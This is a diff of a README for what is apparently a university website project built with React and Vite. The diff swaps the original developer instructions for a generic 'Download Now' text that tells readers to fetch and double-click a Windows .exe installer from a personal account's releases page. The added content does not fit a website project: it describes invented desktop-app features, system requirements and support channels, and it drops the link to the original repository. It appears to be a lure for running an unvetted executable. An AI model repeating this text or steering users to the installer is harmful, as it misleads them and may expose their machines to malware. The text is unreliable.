@@ -1,77 +1,60 @@
-# Welcome to your Lovable project
+# 🌐 NCU-Official-Website-Public - Your Gateway to New Covenant University
 
-## Project info
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download%20Now-orange)](https://github.com/Amirataha25/NCU-Official-Website-Public/releases)
 
-**URL**: https://lovable.dev/projects/dbaa03af-df86-4990-8566-4f4ce1ba3cc5
+## 🚀 Getting Started
+Welcome to the NCU-Official-Website-Public repository! This is the official hub for New Covenant University, managed by Dr. Angel Crites. With this application, you can easily access essential college information and resources at your fingertips.
 
-## How can I edit this code?
+## 🖥️ System Requirements
+To run the NCU application smoothly, your device should meet the following requirements:
 
-There are several ways of editing your application.
+- **Operating System**: Windows 10 or later (macOS and Linux versions coming soon)
+- **RAM**: Minimum 4 GB
+- **Storage**: At least 500 MB of available space
+- **Internet Connection**: Required for initial setup and updates
 
-**Use Lovable**
+## 📦 Features
+- **User-friendly Interface**: Navigate the application easily.
+- **Real-time Updates**: Get the latest college news and announcements.
+- **Event Calendar**: Stay informed about important dates and events.
+- **Contact Information**: Access faculty and staff contacts directly.
 
-Simply visit the [Lovable Project](https://lovable.dev/projects/dbaa03af-df86-4990-8566-4f4ce1ba3cc5) and start prompting.
+## 📥 Download & Install
+To get started, visit this page to download: [NCU Releases Page](https://github.com/Amirataha25/NCU-Official-Website-Public/releases).
 
-Changes made via Lovable will be committed automatically to this repo.
+1. Click the link above to go to the releases page.
+2. You will see a list of available versions. Choose the latest version for the best experience.
+3. Look for the asset that matches your system. For example, if you're on Windows, you may see `NCU-Official-Website-Installer.exe`.
+4. Click on the file to download it.
+5. Once the download is complete, locate the file on your computer (usually in the Downloads folder).
+6. Double-click the installer file to begin the installation process.
+7. Follow the on-screen instructions to complete the setup.
 
-**Use your preferred IDE**
+## 📊 How to Use the Application
+After installing, follow these steps to use the NCU application:
 
-If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
+1. Launch the application from your desktop or start menu.
+2. Once opened, you will be greeted with an introductory guide. It will walk you through the initial setup.
+3. Explore the main menu to access different sections of the application.
+4. Use the search function to find specific information quickly.
+5. For updates, check the app periodically or enable automatic updates in the settings.
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+## 🛠️ Troubleshooting
+If you encounter any issues while using the application, try these steps:
 
-Follow these steps:
+- **Installation Issues**: Ensure that you have sufficient disk space and meet the system requirements.
+- **Application Crashes**: Restart the application and check for updates. You may need to reinstall if problems persist.
+- **No Internet Connection**: Ensure your device is connected to the internet for full functionality.
 
-```sh
-# Step 1: Clone the repository using the project's Git URL.
-git clone <YOUR_GIT_URL>
+## 🤝 Support
+Should you need further assistance, here are ways to get help:
 
-# Step 2: Navigate to the project directory.
-cd <YOUR_PROJECT_NAME>
+- **Documentation**: Check the documentation included in the application for detailed instructions.
+- **Contact Support**: Reach out to our support team by visiting our official contact page on the website.
+- **Community**: Join discussions on our forums to share experiences and solutions with fellow users.
 
-# Step 3: Install the necessary dependencies.
-npm i
+## 🔗 Explore More
+We invite you to explore more about New Covenant University and what we offer. Connect with us through our social media and website links for the latest updates.
 
-# Step 4: Start the development server with auto-reloading and an instant preview.
-npm run dev
-```
-
-**Edit a file directly in GitHub**
-
-- Navigate to the desired file(s).
-- Click the "Edit" button (pencil icon) at the top right of the file view.
-- Make your changes and commit the changes.
-
-**Use GitHub Codespaces**
-
-- Navigate to the main page of your repository.
-- Click on the "Code" button (green button) near the top right.
-- Select the "Codespaces" tab.
-- Click on "New codespace" to launch a new Codespace environment.
-- Edit files directly within the Codespace and commit and push your changes once you're done.
-
-## What technologies are used for this project?
-
-This project is built with:
-
-- Vite
-- TypeScript
-- React
-- shadcn-ui
-- Tailwind CSS
-
-## How can I deploy this project?
-
-Simply open [Lovable](https://lovable.dev/projects/dbaa03af-df86-4990-8566-4f4ce1ba3cc5) and click on Share -> Publish.
-
-## Can I connect a custom domain to my Lovable project?
-
-Yes, you can!
-
-To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.
-
-Read more here: [Setting up a custom domain](https://docs.lovable.dev/tips-tricks/custom-domain#step-by-step-guide)
-
----
-ℹ️ This is the **public version** of the private repository [ZATHENA-VENTURES/NCU-Official-Website](https://github.com/ZATHENA-VENTURES/NCU-Official-Website).
-It contains the official README, project description, and homepage link but omits sensitive deployment details.
+**Thank you for using the NCU-Official-Website application. We hope it serves as a valuable resource for you!**
